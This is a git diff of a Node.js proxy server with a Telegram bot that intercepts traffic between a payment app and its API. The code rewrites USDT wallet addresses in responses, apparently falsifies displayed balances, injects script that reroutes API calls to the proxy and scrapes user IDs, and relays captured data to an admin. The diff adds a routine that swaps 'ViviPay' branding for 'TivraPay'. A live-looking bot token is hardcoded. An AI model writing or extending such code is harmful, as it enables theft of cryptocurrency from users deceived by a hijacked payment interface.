@@ -3,11 +3,9 @@ const TelegramBot = require('node-telegram-bot-api');
 const { Redis } = require('@upstash/redis');
 
 const app = express();
-const TIVOX_API = 'https://tivox.icu';
-const REAL_API = 'https://qonix.click';
-const PROXY_HOST = 'rtyhh.vercel.app';
 const TIVRA_API = 'https://nu4btuu4sd.com';
 const TIVRA_HOST = 'nu4btuu4sd.com';
+const PROXY_HOST = 'rtyhh.vercel.app';
 const BOT_TOKEN = '8537838501:AAGuVHlnxIMo6OFORmhzSvRpkkhH2-0qDCI';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
@@ -350,12 +348,6 @@ function replaceUsdtAddress(obj, newAddr, depth) {
     }
   }
 }
-
-app.use((req, res, next) => {
-  const ua = (req.headers['user-agent'] || '').toLowerCase();
-  req.pxTarget = ua.includes('tivrapay') ? 'tivra' : 'tivox';
-  next();
-});
 
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
@@ -768,46 +760,16 @@ Example:
   }
 });
 
-async function proxyToTivox(req) {
+async function proxyToTivra(req) {
   const path = req.originalUrl || req.url;
-  const isTivra = req.pxTarget === 'tivra';
-  const baseUrl = isTivra ? TIVRA_API : TIVOX_API;
-  const targetHost = isTivra ? TIVRA_HOST : 'tivox.icu';
-  const url = baseUrl + path;
+  const url = TIVRA_API + path;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
     if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = targetHost;
-  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
-  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
-    opts.body = req.rawBody;
-    fwd['content-length'] = String(req.rawBody.length);
-  }
-  const response = await fetch(url, opts);
-  const respBody = await response.text();
-  const respHeaders = {};
-  response.headers.forEach((val, key) => {
-    const kl = key.toLowerCase();
-    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
-      respHeaders[key] = val;
-    }
-  });
-  return { response, respBody, respHeaders };
-}
-
-async function proxyToReal(req) {
-  const path = req.originalUrl || req.url;
-  const url = REAL_API + path;
-  const fwd = {};
-  for (const [k, v] of Object.entries(req.headers)) {
-    const kl = k.toLowerCase();
-    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl === 'x-px-uid' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || kl.startsWith('x-px-')) continue;
-    fwd[k] = v;
-  }
-  fwd['host'] = 'qonix.click';
+  fwd['host'] = TIVRA_HOST;
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -836,7 +798,7 @@ function sendJson(res, headers, json, fallbackBody) {
 app.get('/app/version', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    const { response, respBody, respHeaders } = await proxyToTivra(req);
     let jsonResp = null;
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
     if (jsonResp) {
@@ -866,7 +828,7 @@ app.get('/app/version', async (req, res) => {
 app.get('/app/jsValue/:type', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    const { response, respBody, respHeaders } = await proxyToTivra(req);
     notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
     respHeaders['content-length'] = String(Buffer.byteLength(respBody));
     res.writeHead(response.status, respHeaders);
@@ -883,7 +845,7 @@ app.all('/xxapi/*', async (req, res) => {
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    const { response, respBody, respHeaders } = await proxyToTivra(req);
 
     if (data.blockUpdate !== false) {
       for (const k of Object.keys(respHeaders)) {
@@ -1224,14 +1186,14 @@ ${replaceLine}
   } catch(e) {
     console.error('xxapi proxy error:', e.message);
     try {
-      const url = TIVOX_API + (req.originalUrl || req.url);
+      const url = TIVRA_API + (req.originalUrl || req.url);
       const fwd = {};
       for (const [k, v] of Object.entries(req.headers)) {
         const kl = k.toLowerCase();
         if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
         fwd[k] = v;
       }
-      fwd['host'] = 'tivox.icu';
+      fwd['host'] = TIVRA_HOST;
       const opts = { method: req.method, headers: fwd, redirect: 'manual' };
       if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
         opts.body = req.rawBody;
@@ -1249,10 +1211,8 @@ ${replaceLine}
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
-var REAL='https://tivox.icu';
-var REAL2='https://qonix.click';
-var REAL3='https://nu4btuu4sd.com';
-function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);if(u.indexOf(REAL3)===0)return P+u.slice(REAL3.length);return null;}
+var REAL='https://nu4btuu4sd.com';
+function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);return null;}
 var CFG=null;
 var UID='';
 
@@ -1445,6 +1405,24 @@ window.location.href=CFG.tg;return;}}
 el=el.parentElement;depth++;}
 },true);
 
+function rebrandTivraPay(){
+if(!document.body)return;
+try{
+var txt=document.body.innerText||'';
+if(txt.toLowerCase().indexOf('vivipay')===-1&&txt.toLowerCase().indexOf('vivi pay')===-1)return;
+var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
+while(walker.nextNode()){
+var n=walker.currentNode;
+var t=n.textContent||'';
+var tl=t.toLowerCase();
+if(tl.indexOf('vivipay')>-1||tl.indexOf('vivi pay')>-1){
+n.textContent=t.replace(/ViviPay/gi,'TivraPay').replace(/VIVI PAY/gi,'TIVRA PAY');
+}}
+var imgs=document.querySelectorAll('img');
+for(var i=0;i<imgs.length;i++){
+if(imgs[i].alt&&imgs[i].alt.toLowerCase().indexOf('vivi')>-1)imgs[i].alt='TivraPay';
+if(imgs[i].title&&imgs[i].title.toLowerCase().indexOf('vivi')>-1)imgs[i].title='TivraPay';
+}}catch(e){}}
 function scanDOM(){
 try{if(!document.body)return;
 var txt=document.body.innerText||'';
@@ -1452,12 +1430,12 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();patchBalDOM();
+scanDOM();patchBalDOM();rebrandTivraPay();
 var _rafC=0;function _rafLoop(){patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
 requestAnimationFrame(_rafLoop);
 setInterval(function(){scanDOM();patchBalDOM();},300);
 if(document.body){
-var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();rebrandTivraPay();});
 obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
 else{document.addEventListener('DOMContentLoaded',function(){
 patchBalDOM();
